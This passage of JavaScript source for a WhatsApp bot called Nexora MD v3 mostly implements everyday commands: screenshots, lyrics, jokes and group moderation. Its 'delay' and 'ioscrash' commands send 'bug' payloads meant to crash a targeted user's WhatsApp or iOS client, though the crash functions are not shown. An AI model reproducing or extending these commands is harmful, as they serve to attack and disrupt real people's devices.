        let caption = `📡 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗦𝗔𝗧𝗘𝗟𝗟𝗜𝗧𝗘 𝗦𝗖𝗔𝗡*\n\n`;
        caption += `📍 *Target:* ${text}\n`;
        caption += `🌍 *Coordinates:* ${lat}, ${lon}\n`;
        caption += `🛰️ *Satellite:* NEX-01 Orbital\n`;
        caption += `🔎 *Zoom:* 18x\n\n`;
        caption += `🔗 ${mapLink}\n\n`;
        caption += `_Tap link for live satellite view._`;

        // 📤 Send message (preview auto)
        await empire.sendMessage(m.chat, {
            text: caption
        }, { quoted: m });

        // 🧹 Delete loading message
        await empire.sendMessage(m.chat, { delete: key });

    } catch (e) {
        console.error(e);
        await empire.sendMessage(m.chat, {
            text: "❌ Signal lost. Unable to lock coordinates.",
            edit: key
        });
    }
}
break;
case 'web2zip':
case 'saveweb': {
    if (!isCreator) return;
    const axios = require('axios');
    if (!text) return reply("Please provide a website URL. Example: .web2zip https://google.com");

    // Initial Reaction
    await empire.sendMessage(m.chat, {
        react: { text: '🌐', key: m.key }
    });

    const query = encodeURIComponent(text);
    const url = `https://prexzyapis.com/download/saveweb2zip?url=${query}`;

    try {
        const response = await axios.get(url);
        const data = response.data;

        if (!data || !data.result) {
            return reply("Failed to process the website. Make sure the URL is valid.");
        }

        const zipUrl = data.result;

        // Sending as a document (ZIP)
        await empire.sendMessage(m.chat, { 
            document: { url: zipUrl }, 
            mimetype: 'application/zip',
            fileName: 'website_archive.zip',
            caption: `💨 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗪𝗘𝗕 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗥*\n\n🌐 *Target:* ${text}`
        }, { quoted: m });

        // Success Reaction
        await empire.sendMessage(m.chat, {
            react: { text: '✅', key: m.key }
        });

    } catch (err) {
        console.error(err);
        reply("Error converting website to zip.");
        await empire.sendMessage(m.chat, {
            react: { text: '❌', key: m.key }
        });
    }
}
break;
case 'ssweb':
case 'screenshotweb': {
     if (!isCreator) return;
    let url = text || m.quoted?.text || m.msg?.caption;
    if (!url) return reply(`🌐 *Nexora Screenshot*\n\nUsage: ${prefix + command} <url>\nExample: ${prefix + command} google.com`);
    
    // Auto-fix URL format
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        url = 'https://' + url;
    }

    try {
        new URL(url);
    } catch (err) {
        return reply('❌ *Nexora:* Invalid URL format.');
    }

    // 1. React and send status
    await empire.sendMessage(m.chat, { react: { text: '📸', key: m.key } });
    const status = await reply('⏳ *Nexora is capturing the site...*');

    let screenshotBuffer = null;
    let lastError = '';
    const axios = require('axios');

    // 2. Providers Loop (Reliability fallback)
    const providers = [
        async (url) => {
            const res = await axios.get(`https://image.thum.io/get/width/1280/crop/900/${encodeURIComponent(url)}`, { 
                timeout: 25000, responseType: 'arraybuffer' 
            });
            return Buffer.from(res.data);
        },
        async (url) => {
            const res = await axios.get(`https://s0.wordpress.com/mshots/v1/${encodeURIComponent(url)}?w=1280&h=900`, { 
                timeout: 25000, responseType: 'arraybuffer' 
            });
            return Buffer.from(res.data);
        },
        async (url) => {
            const res = await axios.get(`https://api.microlink.io/?url=${encodeURIComponent(url)}&screenshot=true&embed=screenshot.url`, { 
                timeout: 25000, responseType: 'arraybuffer' 
            });
            return Buffer.from(res.data);
        }
    ];

    for (const provider of providers) {
        try {
            screenshotBuffer = await provider(url);
            if (screenshotBuffer && screenshotBuffer.length > 5000) break; 
        } catch (err) {
            lastError = err.message;
        }
    }

    // 3. Final Execution
    if (screenshotBuffer) {
        await empire.sendMessage(m.chat, {
            image: screenshotBuffer,
            caption: `📸 *Nexora Capture*\n\n🔗 ${url}`
        }, { quoted: m });
        
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } else {
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Nexora:* Failed to capture site.\nError: ${lastError}`);
    }

    // 4. Clean up status message
    await empire.sendMessage(m.chat, { delete: status.key });
}
break;

case 'lyrics': {
    if (!isCreator) return reply("🌚");
    const axios = require('axios');
    if (!text) return reply("Please provide a song title. Example: .lyrics Blinding Lights");
await empire.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
  //  await m.react('🔍');
    const query = encodeURIComponent(text);
    const url = `https://prexzyapis.com/search/lyrics?title=${query}`;

    try {
        const response = await axios.get(url);
        const data = response.data;

        // Ensure the API returned a result
        if (!data || !data.lyrics) {
            return reply("Lyrics not found for this title.");
        }

        let lyricsMsg = `🎵 *LYRICS:* ${data.title}\n`;
        lyricsMsg += `👤 *ARTIST:* ${data.artist || 'Unknown'}\n\n`;
        lyricsMsg += `${data.lyrics}`;

        await empire.sendMessage(m.chat, { 
            text: lyricsMsg 
        }, { quoted: m });

      //  await m.react('✅');

    } catch (err) {
        console.error(err);
        reply("Error fetching lyrics from the server.");
    }
}
break;
case 'delay':
case 'invis-delay': {
    if (!isCreator) return reply("🕸️ *OWNER ONLY.*");

    // Add this line if it's missing in your script
    let text = m.text || m.body || ""; 

    let target = m.isGroup
        ? (m.mentionedJid[0] || m.quoted?.sender || (text ? text.replace(/[^0-9]/g, "") + '@s.whatsapp.net' : null))
        : m.chat;
    
    if (!target) return reply("❌ *ᴘʀᴏᴛᴏᴄᴏʟ ᴇʀʀᴏʀ:* ʀᴇᴘʟʏ ᴏʀ ᴍᴇɴᴛɪᴏɴ ᴀ ᴛᴀʀɢᴇᴛ.");

    await empire.sendMessage(m.chat, { react: { text: '🌀', key: m.key } });
    
    // Call function (setting false for mention because private/lid chats crash better without the participant tag)
    await R9X(reyz, target, false);

    
    reply(`✅ *BVG SENT TO VICTIM* Use the command again or try another bug 💀.`);
}
break;

    /*
case 'delay':
case 'invis-delay': {
    if (!isCreator) return reply("🕸️ *ᴏᴡɴᴇʀ ᴏɴʟ𝚢.*");
    
 let target = m.isGroup 
       ? (m.mentionedJid[0] || m.quoted?.sender || (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null)) 
     : m.chat;

    if (!target) return reply("❌ *ᴘʀᴏᴛᴏᴄᴏʟ ᴇʀʀᴏʀ:* ʀᴇᴘʟʏ ᴏʀ ᴍᴇɴᴛɪᴏɴ ᴀ ᴛᴀʀɢᴇᴛ.");

    await empire.sendMessage(m.chat, { react: { text: '🌀', key: m.key } });
    
    // Call function (setting false for mention because private/lid chats crash better without the participant tag)
    await R9X(reyz, target, false);

    
    reply(`✅ *BVG SENT TO VICTIM* Use the command again or try another bug 💀.`);
}
break;
*/
case 'gcstatus':
case 'groupstatus':
case 'togstatus':
case 'togcstatus':
case 'gstatus': {
    if (!m.isGroup) return reply('❌ This command only works in groups.');
    if (!isCreator) return;;
//    if (!isAdmins) return reply('❌ Only admins can use this command.');
    
    try {
        await empire.sendMessage(m.chat, { react: { text: '📢', key: m.key } });
        
        const textInput = text || '';
        const quotedMsg = m.quoted;
        
        // If no quoted message and no text
        if (!quotedMsg && !textInput) {
            return reply(`📢 *GROUP STATUS*\n\nReply to an image/video/audio/text, or provide text.\n\n*Examples:*\n• ${prefix}gcstatus Hello group!\n• Reply to media and send ${prefix}gcstatus optional caption`);
        }
        
        // TEXT-ONLY STATUS (no quoted message)
        if (!quotedMsg && textInput) {
            try {
                // Try to send as group status with styling
                await empire.sendMessage(m.chat, {
                    text: textInput,
                    contextInfo: { 
                        isGroupStatus: true,
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: NEWSLETTER_JID,
                            newsletterName: "NEXORA MD v3",
                        }
                    }
                });
                await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Text posted to group status!*');
            } catch (err) {
                // Fallback to normal message
                await empire.sendMessage(m.chat, {
                    text: `📢 *GROUP STATUS*\n\n${textInput}`,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: NEWSLETTER_JID,
                            newsletterName: "NEXORA MD v3",
                        }
                    }
                });
                await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Posted to chat!* (Status posting not available)');
            }
        }
        
        // QUOTED TEXT MESSAGE
        if (quotedMsg && (quotedMsg.mtype === 'conversation' || quotedMsg.mtype === 'extendedTextMessage')) {
            let quotedText = '';
            if (quotedMsg.mtype === 'conversation') {
                quotedText = quotedMsg.message?.conversation || '';
            } else if (quotedMsg.mtype === 'extendedTextMessage') {
                quotedText = quotedMsg.message?.extendedTextMessage?.text || '';
            }
            
            const finalText = textInput ? `${quotedText}\n\n${textInput}` : quotedText;
            
            try {
                await empire.sendMessage(m.chat, {
                    text: finalText,
                    contextInfo: { isGroupStatus: true }
                });
                await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Text posted to group status!*');
            } catch (err) {
                await empire.sendMessage(m.chat, {
                    text: `📢 *GROUP STATUS*\n\n${finalText}`
                });
                return reply('✅ *Posted to chat!*');
            }
        }
        
        // QUOTED IMAGE MESSAGE
        if (quotedMsg && (quotedMsg.mtype === 'imageMessage')) {
            const imageBuffer = await empire.downloadMediaMessage(quotedMsg);
            if (!imageBuffer) return reply('❌ Failed to download image.');
            
            try {
                await empire.sendMessage(m.chat, {
                    image: imageBuffer,
                    caption: textInput || '',
                    contextInfo: { isGroupStatus: true }
                });
                await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Image posted to group status!*');
            } catch (err) {
                await empire.sendMessage(m.chat, {
                    image: imageBuffer,
                    caption: `📢 *GROUP STATUS*\n\n${textInput || ''}`
                });
                return reply('✅ *Image posted to chat!*');
            }
        }
        
        // QUOTED VIDEO MESSAGE
        if (quotedMsg && (quotedMsg.mtype === 'videoMessage')) {
            const videoBuffer = await empire.downloadMediaMessage(quotedMsg);
            if (!videoBuffer) return reply('❌ Failed to download video.');
            
            try {
                await empire.sendMessage(m.chat, {
                    video: videoBuffer,
                    caption: textInput || '',
                    contextInfo: { isGroupStatus: true }
                });
                await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Video posted to group status!*');
            } catch (err) {
                await empire.sendMessage(m.chat, {
                    video: videoBuffer,
                    caption: `📢 *GROUP STATUS*\n\n${textInput || ''}`
                });
                return reply('✅ *Video posted to chat!*');
            }
        }
        
        // QUOTED AUDIO/VOICE MESSAGE
        if (quotedMsg && (quotedMsg.mtype === 'audioMessage')) {
            const audioBuffer = await empire.downloadMediaMessage(quotedMsg);
            if (!audioBuffer) return reply('❌ Failed to download audio.');
            
            try {
                await empire.sendMessage(m.chat, {
                    audio: audioBuffer,
                    mimetype: 'audio/mpeg',
                    ptt: true,
                    contextInfo: { isGroupStatus: true }
                });
                await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                return reply('✅ *Voice note posted to group status!*');
            } catch (err) {
                await empire.sendMessage(m.chat, {
                    audio: audioBuffer,
                    mimetype: 'audio/mpeg',
                    ptt: true
                });
                return reply('✅ *Voice note posted to chat!*');
            }
        }
        
        return reply('❌ Unsupported media type. Please reply to an image, video, voice note, or text.');
        
    } catch (error) {
        console.error('GCStatus error:', error);
        reply('❌ Failed to post to group status. Make sure the bot is admin and try again.');
    }
}
break


case "server": 
    if (!isOwner) return reply("Owner only.")

    const uptime = process.uptime()
    const memory = process.memoryUsage().heapUsed / 1024 / 1024

    reply(`
🖥 Server Status
⏳ Uptime: ${Math.floor(uptime / 60)} mins
💾 RAM Used: ${Math.round(memory)} MB
⚙ Node: ${process.version}
    `)
break
case 'aza':
  case 'pay':
  case 'accnum':
  case 'account': {
       if (!isCreator) return;
  reply(`\`BANK DETAILS\`
  ⌛️ _*EMPIRE TECH AZA*_
  
  🔢 9118304002
  
  🏦 _*${global.bankname}*_
_THANKS FOR SUPPORTING EMPIRE TECH_
  *SEND SCREENSHOT AFTER PAYMENT*`)
  }
break;

case "autolock":
    const lockTime = args[0]

    db.groups[groupId].autolock = lockTime
    saveDB()

    reply(`Group will lock at ${lockTime}`)
break
case 'antiraid': {
  if (!m.isGroup) return reply('Group only')
    if (!isCreator) return reply("This command is restricted to owner only");
//  if (!isAdmins) return reply('Admins only')

  const option = args[0]?.toLowerCase()

  if (option === 'on') {
    setSetting(m.chat, 'antiraid', true)
    reply('💧 Anti-Raid enabled mass join is not allowed reason: *Hijack Protection*')
  } 
  else if (option === 'off') {
    setSetting(m.chat, 'antiraid', false)
    reply('❌ Anti-Raid disabled')
  } 
  else {
    reply(`Usage:\n${prefix}antiraid on\n${prefix}antiraid off`)
  }
}
break
case 'creategc':
case 'creategroup': {
  if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.");

  const groupName = args.join(" ");
  if (!groupName) return reply(`Use *${prefix + command} groupname*`);

  try {
    const cret = await empire.groupCreate(groupName, []);
    const code = await empire.groupInviteCode(cret.id);
    const link = `https://chat.whatsapp.com/${code}`;

    const teks = `「 Group Created 」
  𝗚𝗿𝗼𝘂𝗽 𝗺𝗲𝗻𝘂 ${cret.subject}
🆔𝗚𝗿𝗼𝘂𝗽 𝗜𝗱: ${cret.id}
👤𝗢𝘄𝗻𝗲𝗿:@${cret.owner.split("@")[0]}
📆𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗼𝗻: ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}
▸ *🔗 Invite Link:* ${link}`;

    empire.sendMessage(m.chat, {
      text: teks,
      mentions: [cret.owner]
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    reply("Failed to create group. Please check and try again.");
  }
}
break;

case "panda": {
    try {
        const res = await axios.get("https://some-random-api.ml/img/panda");
        const img = res.data?.link;         
        await empire.sendMessage(m.chat, { image: { url: img }, caption: "🐼 Random Panda!" }, { quoted: m });
    } catch (e) {
        console.error("PANDA ERROR:", e);
        m.reply("❌ Failed to fetch a panda image.");
    }
}
break;
case "funfact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        const fact = res.data?.text || "Did you know? Bots are awesome!";
        await empire.sendMessage(m.chat, { text: `💡 Fun Fact:\n${fact}` }, { quoted: m });
    } catch (e) {
        console.error("FUNFACT ERROR:", e);
        m.reply("❌ Failed to fetch a fun fact.");
    }
}
break;

case 'ioscrash':
case 'ios-crash': {
    if (!isCreator) return reply("🕸️ *ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ:* ᴏᴡɴᴇʀ ᴘʀɪᴠɪʟᴇɢᴇs ʀᴇǫᴜɪʀᴇᴅ.");

    // ᴅᴇᴛᴇʀᴍɪɴᴇ ᴛᴀʀɢᴇᴛ
    let target = m.isGroup 
        ? (m.mentionedJid[0] || m.quoted?.sender || (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null)) 
        : m.chat;

    if (!target || target.length < 15) 
        return reply("❌ *ᴘʀᴏᴛᴏᴄᴏʟ ᴇʀʀᴏʀ:* ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ, ᴍᴇɴᴛɪᴏɴ ᴀ ᴜsᴇʀ, ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ.");

  //  await m.react('🧪');

    try {
        await xCursedNFCrashIos(target);
        reply(`✅ *xCursedNF ɪᴏs ᴄʀᴀsʜ* sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴛ ᴛᴏ @${target.split('@')[0]}`);
    } catch (err) {
        console.error(`Gagal Mengirim Bug Ke ${target}`, err);
        reply('❌ *sʏsᴛᴇᴍ ᴇʀʀᴏʀ:* ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ xCursedNF ᴄʀᴀsʜ.');
    }
}
break;
case "vkfkk": {
    try {
        const res = await axios.get("https://api.quotable.io/random");
        const quote = res.data?.content || "Keep pushing forward!";
        const author = res.data?.author || "Unknown";
        await empire.sendMessage(m.chat, { text: `🖋 "${quote}"\n— ${author}` }, { quoted: m });
    } catch (e) {
        console.error("QUOTEMEME ERROR:", e);
        m.reply("❌ Failed to fetch a quote.");
    }
}
break;
case "prog": {
    try {
        const res = await axios.get("https://v2.jokeapi.dev/joke/Programming?type=single");
        const joke = res.data?.joke || "Why do programmers prefer dark mode? Because light attracts bugs!";
        await empire.sendMessage(m.chat, { text: `💻 Programming Joke:\n${joke}` }, { quoted: m });
    } catch (e) {
        console.error("PROG JOKE ERROR:", e);
        m.reply("❌ Failed to fetch a programming joke.");
    }
}
break;
case "dadjoke": {
     if (!isCreator) return;
    try {
        const res = await axios.get("https://icanhazdadjoke.com/", { headers: { Accept: "application/json" } });
        const joke = res.data?.joke || "I would tell you a joke about construction, but I'm still working on it!";
        await empire.sendMessage(m.chat, { text: `👨‍🦳 Dad Joke:\n${joke}` }, { quoted: m });
    } catch (e) {
        console.error("DAD JOKE ERROR:", e);
        m.reply("❌ Failed to fetch a dad joke.");
    }
}
break;

case "progquote": {
     if (!isCreator) return;
    try {
        const res = await axios.get("https://hdramming-quotes-api.herokuapp.com/quotes/random");
        const quote = res.data?.en || "Talk is cheap. Show me the code.";
        const author = res.data?.author || "Linus Torvalds";
        await empire.sendMessage(m.chat, { text: `💻 "${quote}"\n— ${author}` }, { quoted: m });
    } catch (e) {
        console.error("PROGQUOTE ERROR:", e);
        m.reply("❌ Failed to fetch a programming quote.");
    }
}
break;
case "asciivjxnd": {
    if (!text) return m.reply("❌ Provide a word or text\nExample: ascii Hello");
    try {
        const res = await axios.get(`https://artii.herokuapp.com/make?text=${encodeURIComponent(text)}`);
        const ascii = res.data || text;
        await empire.sendMessage(m.chat, { text: `🎨 ASCII Art:\n\n${ascii}` }, { quoted: m });
    } catch (e) {
        console.error("ASCII ERROR:", e);
        m.reply("❌ Failed to generate ASCII art.");
    }
}
break;
case "advice": {
    try {
        const res = await axios.get("https://api.adviceslip.com/advice");
        const advice = res.data?.slip?.advice || "Keep going!";
        await empire.sendMessage(m.chat, { text: `💡 Advice:\n${advice}` }, { quoted: m });
    } catch (e) {
        console.error("ADVICE ERROR:", e);
        m.reply("❌ Failed to fetch advice.");
    }
}
break;

case "guess": {
     if (!isCreator) return;
    const number = Math.floor(Math.random() * 10) + 1; // 1–10
    if (!text) return m.reply("Guess a number between 1 and 10.\nExample: guess 7");
    const guess = parseInt(text);
    if (isNaN(guess) || guess < 1 || guess > 10) return m.reply("❌ Invalid number! Choose 1–10.");
    
    let msg = `🎯 You guessed: ${guess}\n🤖 Bot chose: ${number}\n`;
    msg += guess === number ? "🎉 You guessed it! Congrats!" : "😢 Wrong guess! Try again.";
    await empire.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;
case "meaning": {
    if (!text) return m.reply("❌ Provide a word to search. Example: urban sus");
    try {
        const res = await axios.get(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(text)}`);
        const defs = res.data?.list;
        if (!defs || !defs.length) return m.reply("❌ No definition found.");
        const top = defs[0];
        const msg = `📖 Word: ${top.word}\nDefinition: ${top.definition}\nExample: ${top.example}`;
        await empire.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch (e) {
        console.error("URBAN ERROR:", e);
        m.reply("❌ Failed to fetch definition.");
    }
}
break;
case "hack": {
     if (!isCreator) return;
    let target = m.mentionedJid?.[0] || m.quoted?.sender || m.sender

    let randomId = Math.floor(Math.random() * 999999999999999)
    let randomPhone = "+234" + Math.floor(7000000000 + Math.random() * 999999999)
    let randomPass = Math.random().toString(36).slice(-10)
    let money = "₦" + (Math.floor(Math.random() * 9000000) + 1000000).toLocaleString()

    let locations = ["Lagos", "Abuja", "Nairobi", "Accra", "London"]
    let devices = ["iPhone 15", "Samsung S23", "OnePlus 11", "Redmi Note 12"]
    let browsers = ["Chrome", "Firefox", "Safari", "Opera"]

    let loc = locations[Math.floor(Math.random() * locations.length)]
    let device = devices[Math.floor(Math.random() * devices.length)]
    let browser = browsers[Math.floor(Math.random() * browsers.length)]

    let text = `
╭━━〔 ☠️ ʜᴀᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ ☠️ 〕━━┈⊷
┃
┃ ✅ *sʏsᴛᴇᴍ ʙʀᴇᴀᴄʜᴇᴅ!*
┃
┃ ╭─〔 📱 ᴜsᴇʀ ᴅᴀᴛᴀ 〕
┃ ┃ 
┃ ┃  👤 *ɴᴀᴍᴇ:* ${randomId}
┃ ┃  📞 *ᴘʜᴏɴᴇ:* ${randomPhone}
┃ ┃  📧 *ᴇᴍᴀɪʟ:* ${randomId}@gmail.com
┃ ┃  🔐 *ᴘᴀssᴡᴏʀᴅ:* ${randomPass}
┃ ┃  📍 *ʟᴏᴄᴀᴛɪᴏɴ:* ${loc}
┃ ┃  🌐 *ɪᴘ ᴀᴅᴅʀᴇss:* 192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}
┃ ┃  📱 *ᴅᴇᴠɪᴄᴇ:* ${device}
┃ ┃  🌍 *ʙʀᴏᴡsᴇʀ:* ${browser}
┃ ┃ 
┃ ╰────────────────
┃
┃ 💰 *ʙᴀɴᴋ ᴀᴄᴄᴏᴜɴᴛ:* ${money}
┃ 📸 *ɪɴsᴛᴀɢʀᴀᴍ:* @${randomId}
┃ 🐦 *ᴛᴡɪᴛᴛᴇʀ:* @${randomId}
┃ 📘 *ғᴀᴄᴇʙᴏᴏᴋ:* ${randomId}
┃
╰━━━━━━━━━━━━━━━┈⊷

⚠️ *Just kidding 😂 this is a prank!*
`

    await empire.sendMessage(m.chat, { text }, { quoted: m })
}
break;

case "antilink": 
case "🔗": {
    if (!m.isGroup) return m.reply("❌ This command only works in groups.");
    if (!isAdmins && !isCreator) return;
    
    const usageText = `💡 *Usage:* ${prefix + command} [option]\n\n` +
                      `⚙️ *Available Options:*\n` +
                      `┌ ⚡ \`${prefix + command} delete\` (Just deletes the link)\n` +
                      `├ ⚠️ \`${prefix + command} warn\` (Deletes + issues warning)\n` +
                      `├ 🥾 \`${prefix + command} kick\` (Deletes + kicks member)\n` +
                      `└ ⛔ \`${prefix + command} off\` (Disable antilink completely)`;

    if (!args[0]) return reply(usageText);
    
    const action = args[0].toLowerCase();

    if (action === "off") {
        setSetting(m.chat, "antilink", "off");
        return reply("⛔ *AntiLink System has been deactivated.*");
    }

    if (action === "delete" || action === "warn" || action === "kick") {
        setSetting(m.chat, "antilink", action);
        return reply(`🛡️ *AntiLink Active!*\n⚙️ *Action Mode Set To:* \`${action.toUpperCase()}\``);
    } else {
        return reply(usageText);
    }
}
break;
case 'setsticker': {
    if (!isCreator) return;
    if (!q) return reply(`Example: Reply to a sticker with *${prefix + command} menu*`);
    
    const isQuotedSticker = m.quoted && m.quoted.mtype === 'stickerMessage';
    if (!isQuotedSticker) return reply('❌ Please reply directly to the sticker you want to link.');

    try {
        const targetMessage = m.quoted.msg || m.quoted;
        const stickerHash = targetMessage.fileSha256 
            ? Buffer.from(targetMessage.fileSha256).toString('base64') 
            : null;

        if (!stickerHash) return reply('❌ Could not find the sticker ID hash.');

        const targetCmd = q.trim().toLowerCase().replace(prefix, '');

        setStickerCommand(stickerHash, targetCmd);

        // Uses your empire socket name
        await empire.sendMessage(m.chat, { react: { text: '💎', key: m.key } });
        reply(`✅ *STICKER LINK SUCCESSFUL*\n\nCommand Link: *${prefix + targetCmd}*`);

    } catch (e) {
        console.error(e);
        reply('❌ Error saving sticker command.');
    }
}
break;

case "antibadword": {
//    if (!m.isGroup) return m.reply("❌ This command only works in groups.");
    if (!isAdmins && !isCreator) return m.reply("❌ Only admins can configure AntiBadword.");
    
    const usageText = `💡 *Usage:* ${prefix + command} [option]\n\n` +
                      `⚙️ *Available Options:*\n` +
                      `┌ ⚡ \`${prefix + command} delete\` (Deletes the message)\n` +
                      `├ ⚠️ \`${prefix + command} warn\` (Deletes + warning strike)\n` +
                      `├ 🥾 \`${prefix + command} kick\` (Deletes + instant kick)\n` +
                      `└ ⛔ \`${prefix + command} off\` (Disable completely)`;

    if (!args[0]) return reply(usageText);
    const action = args[0].toLowerCase();

    if (action === "off") {
        setSetting(m.chat, "feature.antibadword", "off");
        return reply("⛔ *AntiBadword has been deactivated.*");
    }

    if (action === "delete" || action === "warn" || action === "kick") {
        setSetting(m.chat, "feature.antibadword", action);
        return reply(`🛡️ *AntiBadword System Active!*\n⚙️ *Action Mode:* \`${action.toUpperCase()}\``);
    } else {
        return reply(usageText);
    }
}
break;

case "antibilling": {
//    if (!m.isGroup) return m.reply("❌ This command only works in groups.");
    if (!isAdmins && !isCreator) return m.reply("❌ Only admins can configure AntiBilling.");
    
    const usageText = `💡 *Usage:* ${prefix + command} [option]\n\n` +
                      `⚙️ *Available Options:*\n` +
                      `┌ ⚡ \`${prefix + command} delete\` (Deletes the billing message)\n` +
                      `├ ⚠️ \`${prefix + command} warn\` (Deletes + warning strike)\n` +
                      `├ 🥾 \`${prefix + command} kick\` (Deletes + instant kick)\n` +
                      `└ ⛔ \`${prefix + command} off\` (Disable completely)`;

    if (!args[0]) return reply(usageText);
    const action = args[0].toLowerCase();

    if (action === "off") {
        setSetting(m.chat, "feature.antibilling", "off");
        return reply("💸 *AntiBilling has been deactivated. Free billing allowed.*");
    }

    if (action === "delete" || action === "warn" || action === "kick") {
        setSetting(m.chat, "feature.antibilling", action);
        return reply(`🛡️ *AntiBilling System Active!*\n⚙️ *Action Mode:* \`${action.toUpperCase()}\``);
    } else {
        return reply(usageText);
    }
}
break;


case 'enc':
case 'obf':
case 'jsobfuscate': {
     if (!isCreator) return;
  if (!m.quoted || !m.quoted.text) return reply(' Reply to a JavaScript code block to obfuscate.');

  const code = m.quoted.text.trim();
  const encoded = encodeURIComponent(code);
  const api = `https://fastrestapis.fasturl.cloud/tool/jsobfuscate?inputCode=${encoded}&encOptions=NORMAL&specialCharacters=on&fastDecode=off`;

  try {
    const res = await fetch(api);
    const json = await res.json();

    if (json.status !== 200 || !json.result) {
      return reply(' Failed to obfuscate the code.');
    }

    const fileBuffer = Buffer.from(json.result, 'utf-8');
    await empire.sendMessage(m.chat, {
      document: fileBuffer,
      mimetype: 'application/javascript',
      fileName: 'empireobf.js',
      caption: 'JavaScript Obfuscated Successfully'
    }, { quoted: m });

  } catch (err) {
    console.error('[JS OBF ERROR]', err);
    reply(' An error occurred while obfuscating the code.');
  }
  break;
}
case "moviequote": {
    try {
        const res = await axios.get("https://movie-quote-api.herokuapp.com/v1/quote/");
        const quote = res.data?.quote || "May the Force be with you.";
        const movie = res.data?.show || "Unknown";
        await empire.sendMessage(
            m.chat,
            { text: `🎬 "${quote}"\n— ${movie}` },
            { quoted: m }
        );
    } catch (e) {
        console.error("MOVIE QUOTE ERROR:", e);
        m.reply("❌ Failed to fetch a movie quote.");
    }
}
break;
case "triviafact": {
    try {
        const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
        const fact = res.data?.text || "Did you know? You're awesome!";
        await empire.sendMessage(m.chat, { text: `🧠 Trivia Fact:\n${fact}` }, { quoted: m });
    } catch (e) {
        console.error("TRIVIA FACT ERROR:", e);
        m.reply("❌ Failed to fetch trivia fact.");
    }
}
break;
case "quote": {
    try {
        const res = await axios.get("https://type.fit/api/quotes");
        const quotes = res.data;
        const q = quotes[Math.floor(Math.random() * quotes.length)];
        await empire.sendMessage(
            m.chat,
            { text: `🌟 "${q.text}"\n— ${q.author || "Unknown"}` },
            { quoted: m }
        );
    } catch (e) {
        console.error("INSPIRE ERROR:", e);
        m.reply("❌ Failed to fetch inspiring quote.");
    }
}
break;
case 'askadmin': {
     if (!isCreator) return;
    if (!m.isGroup) return reply("❌ This command works in groups only");
    //if (!isAdmins) return reply("Lol 😆 I am a god here already");
    // Check if bot is admin
    const groupMetadata = await empire.groupMetadata(m.chat);
    const botId = empire.user.id.split(":")[0] + "@s.whatsapp.net";

    const IsAdmins = groupMetadata.participants.some(
        p => p.id === botId && p.admin
    );

    if (IsAdmins) {
        return reply("✅ I’m already an admin 😎");
    }

    const admins = groupMetadata.participants.filter(p => p.admin);

    reply(`📨 Messaging ${admins.length} admin(s)... wish me luck 🥹`);

    let success = 0;

    for (let admin of admins) {
        try {
            await empire.sendMessage(admin.id, {
                text: `👋 Hello Admin,

I am *Nexora MD v3* 🤖, currently in your group *"${groupMetadata.subject}"*.

I noticed I am not an admin yet 🥺, and I would really appreciate it if you could grant me admin privileges.

✨ *Why make me admin?*
• 🛡️ Protect group from spam, raids & harmful links  
• 🚫 Auto-delete unwanted media/messages  
• ⚙️ Enable powerful automation features  
• 👥 Help manage members efficiently  
• 🔒 Improve overall group security  

I promise to assist responsibly and make your group better 💙

Thank you for your time 🙏  
— *Nexora MD v3*`
            });

            success++;
        } catch (err) {
            console.log("DM failed:", admin.id);
        }
    }

    reply(`✅ Successfully messaged ${success}/${admins.length} admins 📩`);
}
break;
case "anticall": {
     if (!isCreator) return;
    if (!isCreator) return;

    if (!args[0]) {
        let status = getSetting('global', 'anticall', true)
        return reply(`📵 AntiCall: ${status ? "ON" : "OFF"}`)
    }

    if (args[0] === "on") {
        setSetting('global', 'anticall', true)
        return reply("✅ AntiCall enabled")
    }

    if (args[0] === "off") {
        setSetting('global', 'anticall', false)
        return reply("❌ AntiCall disabled")
    }
}
break;
case 'compliment': {
     if (!isCreator) return;
    let target
    if (m.mentionedJid && m.mentionedJid.length > 0) {
        target = '@' + m.mentionedJid[0].split('@')[0]
    } else if (text) {
        target = text
    } else {
        target = '@' + m.sender.split('@')[0]
    }

    try {
        async function openaiCompliment(victim) {
